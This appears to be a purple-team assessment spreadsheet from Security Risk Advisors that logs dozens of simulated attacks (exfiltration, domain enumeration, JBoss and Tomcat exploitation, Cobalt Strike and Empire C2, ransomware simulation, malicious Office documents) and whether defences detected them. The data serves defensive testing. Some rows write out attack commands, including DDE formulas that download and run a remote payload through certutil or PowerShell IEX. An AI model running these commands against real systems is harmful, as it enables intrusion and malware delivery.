Enterprise Purple – 2018 Q3,Data Exfil Methods - Email and USB,Exfiltration,"Email sensitive data to external recipient using automated script (PII, PHI, others)",T1020,,Exfil data using email,Completed,Detected,High,TBD,TBD,,,,,DLP,Spriggan,2018-08-20T15:21:38.717Z,1534778498717,2018-08-20T16:19:00.717Z,1534781940717,2018-08-20T17:46:13.717Z,1534787173717,Security Risk Advisors,,"Email test data to simulate PII, credit card numbers, PHI, etc. leaving the network over email.",Send an email with sensitive data in the body.,,Medium,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2018 Q3,Data Exfil Methods - Email and USB,Exfiltration,Suspicious use of makecab,,,Data compression,Completed,NotDetected,TBD,TBD,No,,1) Suspicious use of makecab is detected by EDR and/or SIEM tool,,,"SIEM,EDR",,2018-08-19T21:39:56.717Z,1534714796717,2018-08-19T22:53:30.717Z,1534719210717,2018-08-20T00:49:13.717Z,1534726153717,Security Risk Advisors,,Using the built in makecab tool to compress files prior to exfiltration.,"makecab ""important_file.txt"" ""not_important_file.cab"" /L ""C:\Temp""",,Low,Low,Internal,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q3,Data Exfil Methods - Email and USB,Exfiltration,Extract data via encrypted zip or rar file on USB Drive,T1052,,Exfil data with USB drive,Completed,Blocked,TBD,Yes,TBD,,,,,"DLP,Secure Baselines",Spriggan,2018-08-19T18:57:34.717Z,1534705054717,2018-08-19T19:19:48.717Z,1534706388717,2018-08-19T21:12:46.717Z,1534713166717,Security Risk Advisors,,"Put encrypted zip or rar on USB drive, using AES encryption or other format.",,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q3,Data Exfil Methods - Email and USB,Exfiltration,Email sensitive document to external recipient - Names and DOBs,T1048,,Exfil data using email,Completed,Detected,High,TBD,Yes,,,,,DLP,Spriggan,2018-08-20T05:18:31.717Z,1534742311717,2018-08-20T07:03:02.717Z,1534748582717,2019-01-28T19:10:31.746Z,1548702631746,Security Risk Advisors,,"Email test data to simulate PII, credit card numbers, PHI, etc. leaving the network over email.",Compose email with Names and DOB's and send to an external recipient.,,Medium,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q3,Data Exfil Methods - Email and USB,Exfiltration,Extract data via an unencrypted zip or rar file on USB Drive,T1052,,Exfil data with USB drive,Completed,Blocked,TBD,Yes,TBD,,,,,"DLP,Secure Baselines",Spriggan,2018-08-19T15:45:51.717Z,1534693551717,2018-08-19T16:46:10.717Z,1534697170717,2018-08-19T16:58:57.717Z,1534697937717,Security Risk Advisors,,Put unencrypted zip on USB drive,,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q3,Data Exfil Methods - Email and USB,Exfiltration,Extract data via unencrypted zip or rar file via email,T1560,,Exfil data using email,Completed,Detected,High,TBD,Yes,,,,,"Email Gateway,DLP",Spriggan,2018-08-20T12:24:44.717Z,1534767884717,2018-08-20T12:54:38.717Z,1534769678717,2019-01-28T19:10:54.676Z,1548702654676,Security Risk Advisors,,"Send encrypted zip or rar using Outlook, Gmail, or other popular mail program.",Zip or rar sensitive data and send that file to external email.,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q3,Data Exfil Methods - Email and USB,Exfiltration,Extract data via encrypted zip or rar file via email,T1560,,Exfil data using email,Completed,NotDetected,TBD,TBD,Yes,,,,,"Email Gateway,DLP",,2018-08-20T13:36:54.717Z,1534772214717,2018-08-20T14:26:10.717Z,1534775170717,2018-08-20T14:33:04.717Z,1534775584717,Security Risk Advisors,,"Send encrypted zip or rar using Outlook, Gmail, or other popular mail program.",Zip or rar sensitive data and send that file using email to an external email address.,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q3,External Web App Profiling,Reconnaissance,Directory Brute Force - Customer Web App,,,Web App Discovery,Completed,NotDetected,TBD,TBD,TBD,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall when a large number of HTTP requests are made to one or more external targets.,2) Web application logs are ingested into the SIEM and alerts triggered for suspicious activity (e.g. brute force attacks, large number of 400/500 status codes)",,,"Firewall,SIEM,WAF",,2018-08-03T17:13:03.717Z,1533316383717,2018-08-03T18:50:02.717Z,1533322202717,2018-08-03T20:14:31.717Z,1533327271717,Security Risk Advisors,,Enumerate files and directories on prominent external web apps.,,,High,Low,External,Low,,,,BurpSuite
Enterprise Purple – 2018 Q3,External Web App Profiling,Reconnaissance,Directory Brute Force - Sensitive API,,,Web App Discovery,Completed,NotDetected,TBD,TBD,TBD,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall when a large number of HTTP requests are made to one or more external targets.,2) Web application logs are ingested into the SIEM and alerts triggered for suspicious activity (e.g. brute force attacks, large number of 400/500 status codes)",,,"Firewall,SIEM,WAF",,2018-08-03T23:16:36.717Z,1533338196717,2018-08-03T23:47:36.717Z,1533340056717,2018-08-04T01:08:00.717Z,1533344880717,Security Risk Advisors,,Enumerate files and directories on prominent external web apps.,,,High,Low,External,Low,,,,BurpSuite
Enterprise Purple – 2018 Q3,External Web App Profiling,Reconnaissance,Directory Brute Force - Enterprise Portal,,,Web App Discovery,Completed,NotDetected,TBD,TBD,TBD,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall when a large number of HTTP requests are made to one or more external targets.,2) Web application logs are ingested into the SIEM and alerts triggered for suspicious activity (e.g. brute force attacks, large number of 400/500 status codes)",,,"Firewall,SIEM,WAF",,2018-08-03T21:41:04.717Z,1533332464717,2018-08-03T22:15:18.717Z,1533334518717,2018-08-03T22:44:12.717Z,1533336252717,Security Risk Advisors,,Enumerate files and directories on prominent external web apps.,,,High,Low,External,Low,,,,BurpSuite
Enterprise Purple – 2018 Q3,Windows Domain Enumeration,Discovery,Domain Enumeration - NET,T1087,,Domain Enumeration,Completed,Detected,Low,TBD,No,,"1) Windows enumeration activities detected from large amount of network traffic (SMB, ARP requests) from UEBA or network monitoring tools,2) EDR and/or SIEM rules are configured to detect use of native commands such as 'net' and modern PowerShell equivalents",,,"SIEM,EDR,Behavior Analytics",DoDonpachi,2018-08-16T19:53:43.717Z,1534449223717,2018-08-16T20:36:24.717Z,1534451784717,2019-01-28T19:08:41.999Z,1548702521999,Security Risk Advisors,,"Leverage the builtin ""net"" command to perform queries against the Windows domain for common groups.","Domain Controllers:
net group ""Domain Controllers"" /domain

Domain Admins:
net group ""Domain Admins"" /domain

Administrators of the Domain:
net localgroup ""Administrators"" /domain",,High,Low,Internal,High,,,,Native Windows Commands
Enterprise Purple – 2018 Q3,Windows Domain Enumeration,Discovery,Domain Enumeration - NSlookup,T1018,,Domain Enumeration,Completed,NotDetected,TBD,TBD,No,,"1) Large number of scripted nslookup commands potentially detected by EDR and/or SIEM solution, or behavioral monitoring tool",,,"SIEM,EDR,Behavior Analytics",,2018-08-17T08:02:03.717Z,1534492923717,2018-08-17T09:57:41.717Z,1534499861717,2018-08-17T10:50:27.717Z,1534503027717,Security Risk Advisors,,"Leverage the builtin ""nslookup"" command to perform queries against the local DNS servers for specific server information.","DNS Servers: nslookup -type=NS [FQDN]
Domain Controllers: nslookup -type=SRV _ldap._tcp.[FQDN]",,High,Low,Internal,High,,,,Native Windows Commands
Enterprise Purple – 2018 Q3,Windows Domain Enumeration,Discovery,Domain Enumeration - LDAP using PowerShell,T1059.001,,Domain Enumeration,Completed,Detected,Info,TBD,No,,"1) Windows enumeration activities detected from large amount of network traffic (SMB, ARP requests) from UEBA or network monitoring tools,2) Legacy Windows and native PowerShell commands used for enumeration are detected by EDR and/or SIEM rules",,,"SIEM,EDR,Behavior Analytics","DoDonpachi,Progear",2018-08-16T23:56:26.717Z,1534463786717,2018-08-17T00:56:32.717Z,1534467392717,2019-01-28T19:09:00.580Z,1548702540580,Security Risk Advisors,,Use PowerView v3 to perform queries against the Windows domain for common groups.,"List All Admins:
Get-DomainGroupMember -Identity ""Administrators"" -Domain [FQDN] -Recurse | select MemberName | fl",,High,Low,Internal,High,,,,PowerView
Enterprise Purple – 2018 Q3,Windows Domain Enumeration,Discovery,Domain Enumeration - BloodHound,T1018,,Domain Enumeration,Completed,Detected,High,TBD,Yes,,"1) Windows enumeration activities detected from large amount of network traffic (SMB, ARP requests) from UEBA or network monitoring tools,2) Windows utilities used for enumeration are detected by EDR and/or SIEM rules",,,"SIEM,EDR,Behavior Analytics","DoDonpachi,Progear",2018-08-17T04:28:57.717Z,1534480137717,2018-08-17T05:38:56.717Z,1534484336717,2019-01-28T19:09:22.083Z,1548702562083,Security Risk Advisors,,"Use Bloodhound/Sharphound to preform queries across the local domain.

- Domain Group Memberships
- Domain Trusts
- Local Admins
- Sessions","Using SharpHound.ps1:
Invoke-BloodHound

Using SharpHound.exe:
SharpHound.exe",,High,Low,Internal,High,,,,
Enterprise Purple – 2018 Q3,App Server Discovery and Exploitation,Discovery,Targeted Scans and Fuzzing - Target Group 2,T1046,,Web application probing,Completed,Detected,Med,TBD,Yes,,,,,"SIEM,Behavior Analytics",Batrider,2018-08-18T01:39:01.717Z,1534556341717,2018-08-18T01:57:40.717Z,1534557460717,2019-01-28T19:34:08.944Z,1548704048944,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.",Use burp active scan,,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2018 Q3,App Server Discovery and Exploitation,Exploitation,Targeted Scans and Fuzzing - JBoss,T1068,,Web application probing,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious internal scanning is detected by firewall/IDS/IPS, UEBA tool, or honeypot technology,2) Event logs for commonly targeted application server platforms are ingested to SIEM for further analysis and alerting on suspicious activity (e.g. intrusion attempts to Tomcat, Jenkins, JBoss, critical business applications, SSO services, etc.)",,,"SIEM,Behavior Analytics",,2018-08-17T19:48:12.717Z,1534535292717,2018-08-17T21:43:50.717Z,1534542230717,2018-08-17T22:12:53.717Z,1534543973717,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.","Scanner:
msf> use auxiliary/scanner/http/jboss_vulnscan

JMX Console Deployer Upload and Execute:
msf> use exploit/multi/http/jboss_maindeployer",,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2018 Q3,App Server Discovery and Exploitation,Discovery,Targeted Scans and Fuzzing - Target Group 1,T1046,,Web application probing,Completed,Detected,Med,TBD,Yes,,"1) Suspicious internal scanning is detected by firewall/IDS/IPS, UEBA tool, or honeypot technology,2) Event logs for commonly targeted application server platforms are ingested to SIEM for further analysis and alerting on suspicious activity (e.g. intrusion attempts to Tomcat, Jenkins, JBoss, critical business applications, SSO services, etc.)",,,"SIEM,Behavior Analytics",Batrider,2018-08-17T17:23:55.717Z,1534526635717,2018-08-17T17:29:56.717Z,1534526996717,2019-01-28T19:33:51.857Z,1548704031857,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.",Use burp active scan,,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2018 Q3,App Server Discovery and Exploitation,Discovery,"Internal - Stealth Port Scan with 3 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,Detected,Med,TBD,Yes,,"1) Internal port scanning activity detected by potential firewall/IDS/IPS, UEBA tool, or honeypot technology",,,"Firewall,Behavior Analytics",Batrider,2018-08-17T12:49:13.717Z,1534510153717,2018-08-17T14:24:42.717Z,1534515882717,2019-01-28T19:33:34.508Z,1548704014508,Security Risk Advisors,,Run lighter internal port scanning to probe interesting HTTP ports and services.,,,High,Low,Internal,Medium,,,,Nmap
Enterprise Purple – 2018 Q3,App Server Discovery and Exploitation,Exploitation,Targeted Scans and Fuzzing - Tomcat,T1068,,Web application probing,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious internal scanning is detected by firewall/IDS/IPS, UEBA tool, or honeypot technology,2) Event logs for commonly targeted application server platforms are ingested to SIEM for further analysis and alerting on suspicious activity (e.g. intrusion attempts to Tomcat, Jenkins, JBoss, critical business applications, SSO services, etc.)",,,"SIEM,Behavior Analytics",,2018-08-17T23:42:32.717Z,1534549352717,2018-08-18T00:44:31.717Z,1534553071717,2018-08-18T00:57:57.717Z,1534553877717,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.",msf> use auxiliary/scanner/http/tomcat_mgr_login,,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2018 Q3,C2 Channels,Command & Control,Cobalt Strike Default Beacon HTTP payload over tcp/80,T1571,,C2 channel,Completed,Detected,High,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,EDR,Behavior Analytics","MUSHA,Grind Stormer,Batrider",2018-08-11T23:33:49.717Z,1534030429717,2018-08-11T23:36:56.717Z,1534030616717,2019-01-28T19:20:38.346Z,1548703238346,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.",Create a http listener,,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,C2 Channels,Discovery,Egress Buster,T1046,,Network egress checks,Completed,Detected,Low,TBD,Yes,,1) Egress busting scan is detected by IDS/IPS or firewall,,,"Web Gateway,Firewall,Secure Baselines","MUSHA,Batrider",2018-08-12T20:28:27.717Z,1534105707717,2018-08-12T20:59:24.717Z,1534107564717,2019-01-28T18:58:30.278Z,1548701910278,Security Risk Advisors,,"Identify allowed egress services and ports, including all TCP ports and common UDP ports.",,,Low,Low,Internal,Low,,,,Egress Buster
Enterprise Purple – 2018 Q3,C2 Channels,Command & Control,Empire Default Beacon HTTP payload over tcp/80,T1571,,C2 channel,Completed,Detected,High,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,EDR,Behavior Analytics","MUSHA,Grind Stormer",2018-08-12T12:27:50.717Z,1534076870717,2018-08-12T13:50:19.717Z,1534081819717,2019-01-28T19:21:30.427Z,1548703290427,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","uselistener http

Stageless:
launchers <powershell or python> <listener name>

Staged:
usestager <stager-option>
set <option-name> <option-value>
execute",,Medium,High,Both,Medium,,,,Empire
Enterprise Purple – 2018 Q3,C2 Channels,Command & Control,Beacon DNS over udp/53,T1571,,C2 channel,Completed,Blocked,TBD,No,No,,"1) SIEM rules are configured to detect and alert on suspicious DNS traffic,12 Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Firewall,EDR,Secure Baselines,Behavior Analytics",MUSHA,2018-08-12T15:23:19.717Z,1534087399717,2018-08-12T15:57:53.717Z,1534089473717,2019-01-28T18:58:52.899Z,1548701932899,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Purchase a domain name

Create a windows/beacon_dns/reverse_dns_txt listener",,Medium,High,Both,High,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,C2 Channels,Command & Control,Cobalt Strike Default Beacon SMB over tcp/445,T1571,,C2 channel,Completed,Blocked,TBD,No,TBD,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.,2) Suspicious SMB netconns and pivoting from internal systems is detected by EDR or behavioral tools. Examples may include unusual SMB connections from domain controllers and other critical assets.",,,"Firewall,EDR,Behavior Analytics",MUSHA,2018-08-12T17:28:00.717Z,1534094880717,2018-08-12T18:06:40.717Z,1534097200717,2018-08-12T18:52:59.717Z,1534099979717,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various SMB.",Generate default SMB beacon using cobalt strike,,Medium,High,Internal,Medium,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,C2 Channels,Command & Control,Cobalt Strike Custom Beacon HTTP payload over tcp/80,T1095,,C2 channel,Completed,Detected,Low,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,EDR,Behavior Analytics",Batrider,2018-08-12T06:18:16.717Z,1534054696717,2018-08-12T06:33:08.717Z,1534055588717,2019-01-28T19:28:22.918Z,1548703702918,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Create malleable c2 profile

./teamserver [external IP] [password] [/path/to/my.profile]",,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,C2 Channels,Command & Control,Cobalt Strike Custom Beacon HTTPS payload over tcp/443,T1095,,C2 channel,Completed,Detected,Low,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,EDR,Behavior Analytics",Batrider,2018-08-12T07:35:45.717Z,1534059345717,2018-08-12T09:03:59.717Z,1534064639717,2019-01-28T19:28:46.240Z,1548703726240,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Create malleable c2 profile

./teamserver [external IP] [password] [/path/to/my.profile]",,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,C2 Channels,Command & Control,Cobalt Strike Default Beacon HTTPS payload over tcp/443,T1571,,C2 channel,Completed,Detected,High,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,EDR,Behavior Analytics","MUSHA,Batrider",2018-08-12T02:14:37.717Z,1534040077717,2018-08-12T04:10:00.717Z,1534047000717,2019-01-28T19:21:09.584Z,1548703269584,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Install SSL Certs From Lets Encrypt onto the server

Create a https listener",,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 3,T1095,,Malware simulation,Completed,Detected,High,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,"Endpoint Protection,Behavior Analytics",MUSHA,2018-08-21T16:12:34.717Z,1534867954717,2018-08-21T16:44:35.717Z,1534869875717,2019-01-28T19:17:27.444Z,1548703047444,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 1,T1095,,Malware simulation,Completed,Detected,High,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,"Endpoint Protection,Behavior Analytics",Grind Stormer,2018-08-21T11:08:12.717Z,1534849692717,2018-08-21T12:05:53.717Z,1534853153717,2019-01-28T19:16:37.572Z,1548702997572,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 2,T1095,,Malware simulation,Completed,Detected,High,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,"Endpoint Protection,Behavior Analytics","MUSHA,Grind Stormer",2018-08-21T13:35:42.717Z,1534858542717,2018-08-21T14:00:49.717Z,1534860049717,2019-01-28T19:16:57.074Z,1548703017074,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 4,T1095,,Malware simulation,Completed,Detected,High,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,"Endpoint Protection,Behavior Analytics","MUSHA,Grind Stormer",2018-08-21T17:28:37.717Z,1534872517717,2018-08-21T18:05:07.717Z,1534874707717,2019-01-28T19:18:02.898Z,1548703082898,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Malware Profile Simulation,Exploitation,Files with Ransomware Extensions #2,,,Ransomware,Completed,NotDetected,TBD,TBD,No,,,,,"EDR,Endpoint Protection",,2018-08-21T21:08:32.717Z,1534885712717,2018-08-21T21:27:07.717Z,1534886827717,2018-08-21T22:12:36.717Z,1534889556717,Security Risk Advisors,,"Generate a large number of files with a ransomware extension

extension:
- kratos","ps> 1..100 | %{new-item -type file -path ""$_.extension""}",,High,High,Both,Low,,,,
Enterprise Purple – 2018 Q3,Malware Profile Simulation,Exploitation,Files with Ransomware Extensions #1,,,Ransomware,Completed,Detected,High,TBD,TBD,,,,,"EDR,Endpoint Protection",Donpachi,2018-08-21T19:29:52.717Z,1534879792717,2018-08-21T19:34:27.717Z,1534880067717,2018-08-21T20:38:51.717Z,1534883931717,Security Risk Advisors,,"Generate a large number of files with a ransomware extension

extensions:
- locky
- ykcol","ps> 1..100 | %{new-item -type file -path ""$_.extension""}",,High,High,Both,Low,,,,
Enterprise Purple – 2018 Q3,Malicious Document Execution,Execution,5 - Macro - WScript PowerShell XOR,T1203,,Client-side Execution,Completed,Blocked,TBD,No,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Donpachi,2018-08-10T19:01:19.717Z,1533927679717,2018-08-10T20:18:36.717Z,1533932316717,2018-08-10T21:21:53.717Z,1533936113717,Security Risk Advisors,,Execute malicious Office document on the endpoint,Copy macro template into office document,,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Malicious Document Execution,Execution,4 - Macro - WScript EXE,T1203,,Client-side Execution,Completed,Detected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",DoDonpachi,2018-08-11T14:08:48.717Z,1533996528717,2018-08-11T15:14:42.717Z,1534000482717,2019-01-28T18:54:19.318Z,1548701659318,Security Risk Advisors,,Execute malicious Office document on the endpoint,Copy macro template into office document,,Low,Low,Internal,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q3,Malicious Document Execution,Execution,9 - Macro - MSBuild,T1203,,Client-side Execution,Completed,Detected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",DoDonpachi,2018-08-10T22:20:45.717Z,1533939645717,2018-08-11T00:14:18.717Z,1533946458717,2019-01-28T18:55:30.134Z,1548701730134,Security Risk Advisors,,Execute malicious Office document on the endpoint,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe <MALICIOUS_FILE>,,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Malicious Document Execution,Execution,8 - Macro - LuckyStrike PowerShell CellEmbed,T1203,,Client-side Execution,Completed,Detected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",DoDonpachi,2018-08-11T01:19:58.717Z,1533950398717,2018-08-11T02:49:20.717Z,1533955760717,2019-01-28T18:55:17.684Z,1548701717684,Security Risk Advisors,,Execute malicious Office document on the endpoint,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Malicious Document Execution,Execution,7 - Macro - MMG WMI Exe,T1203,,Client-side Execution,Completed,Detected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",DoDonpachi,2018-08-11T19:20:19.717Z,1534015219717,2018-08-11T20:34:03.717Z,1534019643717,2019-01-28T18:55:03.984Z,1548701703984,Security Risk Advisors,,Execute malicious Office document on the endpoint,python MMG.py [config] [output],,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Malicious Document Execution,Execution,1 - Macro - Cobalt Strike Standard,T1203,,Client-side Execution,Completed,Detected,High,No,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines","DoDonpachi,Donpachi",2018-08-10T12:05:30.717Z,1533902730717,2018-08-10T13:34:18.717Z,1533908058717,2019-01-28T18:22:36.682Z,1548699756682,Security Risk Advisors,,Execute malicious Office document on the endpoint,"Generate MS Office Macro from cobalt Strike (Attacks -> Packages -> MS Office Macro)

Put macro in office document

Execute the office document on endpoint",,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Malicious Document Execution,Execution,11 - DDE - Exe,T1203,,Client-side Execution,Completed,Detected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",DoDonpachi,2018-08-11T06:05:29.717Z,1533967529717,2018-08-11T07:14:56.717Z,1533971696717,2019-01-28T18:56:45.238Z,1548701805238,Security Risk Advisors,,Execute malicious Office document on the endpoint,=cmd|'/c certutil https://<exe url> <local file location> && <local file location> && del <local file location>'!A1,,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q3,Malicious Document Execution,Execution,6 - Macro - MMG WMI PowerShell,T1203,,Client-side Execution,Completed,Blocked,TBD,No,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Donpachi,2018-08-11T16:49:20.717Z,1534006160717,2018-08-11T18:34:00.717Z,1534012440717,2018-08-11T18:42:44.717Z,1534012964717,Security Risk Advisors,,Execute malicious Office document on the endpoint,python MMG.py [config] [output],,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Malicious Document Execution,Execution,2 - Macro - CobaltStrike Standard (MMG),T1203,,Client-side Execution,Completed,Detected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",DoDonpachi,2018-08-11T11:06:00.717Z,1533985560717,2018-08-11T12:39:21.717Z,1533991161717,2019-01-28T18:22:59.844Z,1548699779844,Security Risk Advisors,,Execute malicious Office document on the endpoint,python MMG.py [config] [output],,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Malicious Document Execution,Execution,3 - Macro - WScript PowerShell,T1203,,Client-side Execution,Completed,Blocked,TBD,No,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Donpachi,2018-08-10T17:03:55.717Z,1533920635717,2018-08-10T17:44:38.717Z,1533923078717,2018-08-10T18:45:09.717Z,1533926709717,Security Risk Advisors,,Execute malicious Office document on the endpoint,Copy macro template into office document,,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q3,Malicious Document Execution,Execution,12 - Macro - Remote Template,T1203,,Client-side Execution,Completed,Detected,High,TBD,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines","DoDonpachi,Donpachi",2018-08-11T09:28:06.717Z,1533979686717,2018-08-11T10:49:53.717Z,1533984593717,2018-08-11T11:05:53.717Z,1533985553717,Security Risk Advisors,,Execute malicious Office document on the endpoint,"Create a Word document, add the macro, then save as a .dotm 

Host the template

Create a new document and link the hosted template to it 
(Developer -> Document Template -> Document Template Url)",,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q3,Malicious Document Execution,Execution,10 - DDE - PowerShell,T1203,,Client-side Execution,Completed,Detected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines","DoDonpachi,Progear",2018-08-11T03:32:01.717Z,1533958321717,2018-08-11T05:11:59.717Z,1533964319717,2019-01-28T18:56:07.099Z,1548701767099,Security Risk Advisors,,Execute malicious Office document on the endpoint,"=cmd|'/c powershell -Exec ByPass -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString(\""http://<location of payload>\""))'!A1",,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
